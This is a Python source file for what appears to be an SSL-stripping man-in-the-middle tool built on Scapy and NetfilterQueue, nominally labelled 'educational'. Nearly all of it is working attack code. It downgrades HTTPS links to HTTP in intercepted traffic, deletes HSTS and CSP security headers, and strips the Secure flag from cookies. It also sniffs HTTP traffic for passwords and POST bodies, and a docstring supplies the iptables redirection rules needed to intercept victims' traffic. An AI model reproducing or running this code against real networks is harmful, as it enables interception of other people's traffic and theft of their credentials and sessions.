from scapy.all import *
try:
    from netfilterqueue import NetfilterQueue
    NETFILTER_AVAILABLE = True
except ImportError:
    NETFILTER_AVAILABLE = False
    print("[!] NetfilterQueue not available - only sniff mode will work")
import re
import threading
from collections import defaultdict
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S',
    handlers=[
        logging.FileHandler("sslstrip.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


def set_log_mode(silent=False):
    """
    Adjusts logging based on operational mode.
    If silent, remove console output but keep file logging.
    """
    if silent:
        logger.info("Switching to SILENT logging mode (File only)")
        # Find and remove the StreamHandler (console output)
        for handler in logger.handlers[:]:
            if isinstance(handler, logging.StreamHandler):
                logger.removeHandler(handler)

                
class SSLStripper:
    def __init__(self, log_file="sslstrip.log"):
        """
        Initialize the SSL Stripper
        
        Args:
            log_file: Path to file for logging stripped data
        """
        self.log_file = log_file
        self.https_to_http = {}  # Map HTTPS URLs to HTTP for victim
        self.http_to_https = {}  # Map HTTP URLs back to HTTPS for servers
        self.lock = threading.Lock()
        
        # Patterns to detect and replace
        self.https_pattern = re.compile(rb'https://', re.IGNORECASE)
        self.secure_pattern = re.compile(rb'Secure', re.IGNORECASE)
        
        # headers to strip
        self.strip_headers = [
            b'Strict-Transport-Security',
            b'upgrade-insecure-requests',
            b'Content-Security-Policy'
        ]
        
        logger.info("SSL Stripper initialized")
    
    def process_packet(self, packet):
        """
        Main packet processing function for netfilter queue
        
        Args:
            packet: Netfilter queue packet object
        """
        try:
            # Get the actual packet data
            scapy_packet = IP(packet.get_payload())
            
            # Process HTTP traffic
            if scapy_packet.haslayer(TCP):
                if scapy_packet[TCP].dport == 80 or scapy_packet[TCP].sport == 80:
                    modified = self.strip_https_links(scapy_packet)
                    if modified:
                        packet.set_payload(bytes(modified))
                    
                    self.analyze_http_data(scapy_packet)
            
            packet.accept()
            
        except Exception as e:
            logger.error(f"Error processing packet: {e}")
            packet.accept()
    
    def strip_https_links(self, packet):
        """
        Strip HTTPS links from HTTP traffic and replace with HTTP
        
        Args:
            packet: Scapy packet
            
        Returns:
            Modified packet or None if no modification needed
        """
        if not packet.haslayer(Raw):
            return None
        
        try:
            load = packet[Raw].load
            modified = False

            def replace_with_spaces(match):
                return b' ' * len(match.group(0))
            
            # Replace 'https://' with 'http:// ' and fill with space to keep length
            if self.https_pattern.search(load):
                logger.info(f"Found HTTPS link, downgrading...")
                load = self.https_pattern.sub(b'http:// ', load)
                modified = True

            #  Kill the security headers 
            for header in self.strip_headers:
                if header in load:
                    logger.info(f"Nuking security header: {header.decode()}")
                    pattern = header + rb':[^\r\n]*\r\n'
                    load = re.sub(pattern, replace_with_spaces, load, flags=re.IGNORECASE)
                    modified = True
            
            # Remove secure cookies 
            if b'Set-Cookie:' in load and self.secure_pattern.search(load):
                load = self.secure_pattern.sub(replace_with_spaces, load)
                modified = True

            if modified:
                packet[Raw].load = load
                # Delete checksums
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum
                return packet

        except Exception as e:
            logger.error(f"Error in strip_https_links: {e}")
        
        return None
    
    def log_data(self, data_type, data):
        """
        Log interesting data (credentials, forms, etc.) based on operational mode
        in silent mode remove console output
        
        Args:
            data_type: Type of data (e.g., "POST", "GET", "Cookie")
            data: The actual data to log
        """
        with self.lock:
            with open(self.log_file, 'a') as f:
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"\n[{timestamp}] {data_type}\n")
                f.write(f"{data}\n")
                f.write("-" * 80 + "\n")
        
        logger.info(f"Logged {data_type} data")
    
    def analyze_http_data(self, packet):
        """
        Analyze HTTP traffic for credentials and sensitive data
        
        Args:
            packet: Scapy packet
        """
        if not packet.haslayer(Raw):
            return
        
        try:
            load = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # Catch POST requests 
            if 'POST' in load and 'HTTP/1.' in load:
                logger.warning(f"Captured POST Data:")
                # Log the whole load so you see the body 
                print(f"\n[+] RAW POST BODY:\n{load}\n")
                self.log_data("POST Request", load)

            # Catch credential keywords anywhere in the packet
            keywords = ['username=', 'user=', 'uname=', 'password=', 'pass=', 'passwd=', 'pwd=']
            if any(key in load.lower() for key in keywords):
                logger.warning("*** CREDENTIALS FOUND ***")
                print(f"\n[+] SUSPICIOUS DATA SNIFFED:\n{load}\n")
                self.log_data("Credentials", load)
        
        except Exception as e:
            logger.error(f"Error analyzing HTTP data: {e}")
    
    def sniff_credentials(self, interface=None, target_ip=None):
        """
        Sniff HTTP traffic and capture credentials
        
        Args:
            interface: Network interface to sniff on
            target_ip: Optional - only capture traffic from this IP
        """
        logger.info("Starting credential sniffing...")
        if target_ip:
            logger.info(f"Filtering traffic from: {target_ip}")
        
        def packet_callback(packet):
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                # Only process HTTP traffic
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    # Filter by source IP if specified
                    if target_ip and packet.haslayer(IP):
                        if packet[IP].src != target_ip:
                            return
                    
                    # Analyze for credentials
                    self.analyze_http_data(packet)
        
        # Build filter
        filter_str = "tcp port 80"
        if target_ip:
            filter_str = f"tcp port 80 and host {target_ip}"
        
        # Start sniffing
        sniff(
            iface=interface,
            prn=packet_callback,
            filter=filter_str,
            store=0
        )


class SSLStripProxy:
    """
    Alternative implementation using a simple proxy approach
    """
    def __init__(self, interface=None):
        self.interface = interface
        self.stripper = SSLStripper()
        self.running = False
    
    def start_sniffing(self):
        """
        Start sniffing packets (simpler approach without iptables)
        """
        logger.info("Starting SSL Strip sniffing mode...")
        self.running = True
        
        def packet_callback(packet):
            if not self.running:
                return False
            
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                # Analyze HTTP traffic
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    self.stripper.analyze_http_data(packet)
        
        sniff(
            iface=self.interface,
            prn=packet_callback,
            filter="tcp port 80",
            store=0,
            stop_filter=lambda x: not self.running
        )
    
    def stop(self):
        """Stop the SSL stripper"""
        logger.info("Stopping SSL Strip...")
        self.running = False


def start_sslstrip_netfilter(queue_num=0):
    """
    Start SSL stripping using netfilter queue (requires iptables rules)
    
    Prerequisites (run as administrator):
    1. Enable IP forwarding:
       - Windows: Set-NetIPInterface -Forwarding Enabled
       - Linux: echo 1 > /proc/sys/net/ipv4/ip_forward
    
    2. Setup iptables rules (Linux):
       iptables -t nat -A PREROUTING -p tcp --dport 80 -j NFQUEUE --queue-num 0
       iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 80
    
    Args:
        queue_num: Netfilter queue number
    """
    try:
        stripper = SSLStripper()
        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_num, stripper.process_packet)
        
        logger.info(f"SSL Stripper running on queue {queue_num}")
        logger.info("Press CTRL+C to stop")
        
        nfqueue.run()
        
    except KeyboardInterrupt:
        logger.info("\nStopping SSL Stripper...")
    except Exception as e:
        logger.error(f"Error: {e}")
        logger.error("Make sure you have NetfilterQueue installed and proper permissions")
    finally:
        try:
            nfqueue.unbind()
        except:
            pass


def start_sslstrip_sniff(interface=None):
    """
    Start SSL stripping in sniffing mode (simpler, doesn't require iptables)
    This mode only monitors and logs HTTP traffic, doesn't modify it in real-time.
    
    Args:
        interface: Network interface to sniff on (None for default)
    """
    proxy = SSLStripProxy(interface=interface)
    
    try:
        logger.info("Starting SSL Strip in monitoring mode")
        logger.info("This will capture and log HTTP traffic")
        logger.info("Press CTRL+C to stop")
        proxy.start_sniffing()
    except KeyboardInterrupt:
        logger.info("\nStopping...")
        proxy.stop()


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(
        description="SSL Stripping Tool - Educational purposes only"
    )
    parser.add_argument(
        "--mode",
        choices=["netfilter", "sniff"],
        default="sniff",
        help="Mode: 'netfilter' for active stripping (requires setup), 'sniff' for monitoring"
    )
    parser.add_argument(
        "--interface",
        help="Network interface to use (for sniff mode)"
    )
    parser.add_argument(
        "--queue",
        type=int,
        default=0,
        help="Netfilter queue number (for netfilter mode)"
    )
    
    args = parser.parse_args()
    
    if args.mode == "netfilter":
        start_sslstrip_netfilter(args.queue)
    else:
        start_sslstrip_sniff(args.interface)
